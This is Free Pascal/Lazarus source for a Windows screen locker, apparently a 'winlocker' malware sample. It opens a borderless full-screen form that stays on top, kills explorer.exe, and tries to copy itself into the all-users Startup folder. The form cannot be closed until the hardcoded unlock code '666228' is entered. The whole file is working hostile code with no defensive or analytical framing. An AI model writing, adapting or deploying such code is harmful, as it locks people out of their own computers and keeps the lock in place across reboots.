unit main;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, Forms, Controls, Graphics, Dialogs, StdCtrls, ExtCtrls;

type

  { TForm1 }

  TForm1 = class(TForm)
    Button1: TButton;
    Edit1: TEdit;
    Label1: TLabel;
    Label2: TLabel;
    Panel1: TPanel;
    procedure Button1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var CloseAction: TCloseAction);
    procedure FormCreate(Sender: TObject);
  private

  public

  end;

var
  Form1: TForm1;
  code: string;
  closeform: integer;

implementation

{$R *.lfm}

{ TForm1 }

procedure TForm1.FormCreate(Sender: TObject);
begin
  FormStyle := fsStayOnTop;
  Visible := True;
  code := '666228';
  closeform := 1;
  BorderStyle := bsNone;
  Left := 0;
  Top := 0;
  Height := Screen.Height;
  Width := Screen.Width;
  SysUtils.ExecuteProcess(('TASKKILL /F /IM explorer.exe /T'), '', []);
  SysUtils.ExecuteProcess(('copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"'), '', []);
end;

procedure TForm1.FormClose(Sender: TObject; var CloseAction: TCloseAction);
begin
  if closeform = 1 then
     begin
        CloseAction := caNone;
     end
  else
     begin
        CloseAction := caFree;
     end;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
   if Edit1.Text = code then
      begin
         closeform := 0;
         SysUtils.ExecuteProcess(('del /f /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\openlocker.exe"'), '', []);
         SysUtils.ExecuteProcess(('explorer.exe'), '', []);
         Form1.Close;
      end
   else
      begin
         Label1.Caption := 'Код не верный!';
      end;
end;

end.

